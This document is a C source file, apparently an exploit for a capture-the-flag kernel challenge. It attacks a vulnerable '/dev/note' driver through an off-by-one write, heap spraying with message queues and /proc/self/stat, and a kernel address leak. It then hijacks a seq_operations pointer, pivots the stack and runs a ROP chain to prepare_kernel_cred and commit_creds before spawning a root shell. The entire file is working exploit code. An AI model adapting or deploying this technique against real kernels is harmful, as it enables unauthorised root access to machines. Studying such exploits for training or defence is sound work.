#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/mman.h>

int msqid;
int note_fd;

struct message {
    long type;
    char text[0x50];
} msg;

struct info {
   long long int length;
    char *addr;
} args, read_args;

void* race(void *_)
{
    sleep(1);
    socket(22, AF_INET, 0);
    return NULL;
}

void note_alloc()
{
    ioctl(note_fd, 0xC12ED001, &args);
}

void note_close()
{
    ioctl(note_fd, 0xC12ED002, &args);
}

void note_write()
{
    ioctl(note_fd, 0xC12ED003, &args);
}

void note_read()
{
    ioctl(note_fd, 0xC12ED004, &read_args);
}

void msg_alloc(int size)
{
    if (msgsnd(msqid, (void *)&msg, size - 0x30, IPC_NOWAIT) < 0) {
        printf("msgsnd error\n");
        exit(1);
    }
}

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
            :
            : "memory"
    );
}

void *bss_ropchain[0x80000];

int openstat() {
    int stat_fd;
    if ((stat_fd = open("/proc/self/stat", O_RDONLY)) == -1) {
        printf("error: open\n");
        exit(1);
    }
    return stat_fd;
}

void init()
{
    int size = 0x80;

    args.length = size;
    args.addr = malloc(size);
    memset(args.addr, 0x87, 0x8);

    read_args.length = size;
    read_args.addr = malloc(size);

    msg.type = 1;
    memset(msg.text, 'a', 0x10);
}

char *binsh = "/bin/sh";
char *argv[] = {"/bin/sh", NULL};
char *envp[] = {NULL};

void get_shell()
{
    if (execve(binsh, argv, envp)) {
        printf("GG\n");
    }
}

int main()
{
    int msgflg = IPC_CREAT | 0666;
    key_t key = 2234;

    init();

    note_fd = open("/dev/note", O_RDWR);

    if ((msqid = msgget(key, msgflg)) < 0) {
        exit(1);
    }

    // allocate to a new page
    for (int i = 0; i < 41; ++i) {
        msg_alloc(0x80);
    }

    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close();
    msg_alloc(0x80);
    note_alloc();

    // leak
    void *kernel_text;
    unsigned long long int offset;

    socket(22, AF_INET, 0);
    note_read();

    kernel_text = (void *)(*(unsigned long long int *)(&read_args.addr[0x60]));
    kernel_text -= 0x6bac0;
    offset = (unsigned long long int)kernel_text - 0xffffffff81000000;

    printf("kernel_text  : %p\n", kernel_text);
    printf("offset       : %#08llx\n", offset);
    printf("kmalloc      : %p\n", kernel_text + 0x111500);
    printf("kfree        : %p\n", kernel_text + 0x112240);
    printf("main         : %p\n", main);
    printf("bss_ropchain : %p\n", bss_ropchain);

    msg_alloc(0x80);
    
    // allocate to a new page
    msg_alloc(0x80);
    msg_alloc(0x80);
    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close();
    msg_alloc(0x80);
    note_alloc();

    // next kmalloc will allocate memory that is same as note at

    printf("save stats\n");
    save_stats();

    void *xchg_eax_esp         = (void *)offset + 0xffffffff8102ce8f;
    void *pop_rdi              = (void *)offset + 0xffffffff81047823;
    void *mov_rdx_r8           = (void *)offset + 0xffffffff8121a7ab;
    void *mov_rdi_rax          = (void *)offset + 0xffffffff810a296e;
    void *swapgs_pop_rbp       = (void *)offset + 0xffffffff8103ef24;
    void *pop_rsp              = (void *)offset + 0xffffffff81036561;
    void *iretq                = (void *)kernel_text + 0x1d5c6;

    void *prepare_kernel_cred  = (void *)kernel_text + 0x69e00;
    void *commit_creds         = (void *)kernel_text + 0x69c10;

    printf("iretq                  : %p\n", iretq);
    printf("xchg_eax_esp           : %p\n", xchg_eax_esp);

    // memset(args.addr, 0, 0x80);

    void *addr = (void *)((unsigned long long int)xchg_eax_esp & 0xffffffff);
    void *mmap_addr = mmap(addr, sizeof(void *) * 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("addr      : %p\n", addr);
    printf("mmap_addr : %p\n", mmap_addr);

    void **mmap_ropchain = addr;
    int rop_idx = 0;
    int rop_start = 0x5000;

    mmap_ropchain[rop_idx++] = pop_rsp;
    mmap_ropchain[rop_idx++] = &bss_ropchain[rop_start];

    rop_idx = rop_start;

    bss_ropchain[rop_idx++] = pop_rdi;
    bss_ropchain[rop_idx++] = 0;
    bss_ropchain[rop_idx++] = prepare_kernel_cred;
    bss_ropchain[rop_idx++] = mov_rdx_r8;   
    bss_ropchain[rop_idx++] = mov_rdi_rax; // this gadget needs that rdx equals to r8
    bss_ropchain[rop_idx++] = commit_creds;
    bss_ropchain[rop_idx++] = swapgs_pop_rbp;
    bss_ropchain[rop_idx++] = 0;
    bss_ropchain[rop_idx++] = iretq;
    bss_ropchain[rop_idx++] = get_shell;
    bss_ropchain[rop_idx++] = (void *)user_cs;
    bss_ropchain[rop_idx++] = (void *)user_eflags;
    bss_ropchain[rop_idx++] = (void *)user_sp;
    bss_ropchain[rop_idx++] = (void *)user_ss;

    // spray
    for (int i = 0; i < 131; ++i) {
        openstat();
    }

    args.length = 0x20;

    note_alloc();

    // off-by-one
    note_write();

    // move note
    note_close();
    openstat();
    note_alloc();

    // allocate seq_operations
    int stat_fd = openstat();

    // rewrite function pointer of seq_operations
    *(void **)(&args.addr[0]) = (void *)xchg_eax_esp;
    note_write();

    // invoke!
    char buf[0x10];
    read(stat_fd, buf, 0x10);

    return 0;
}
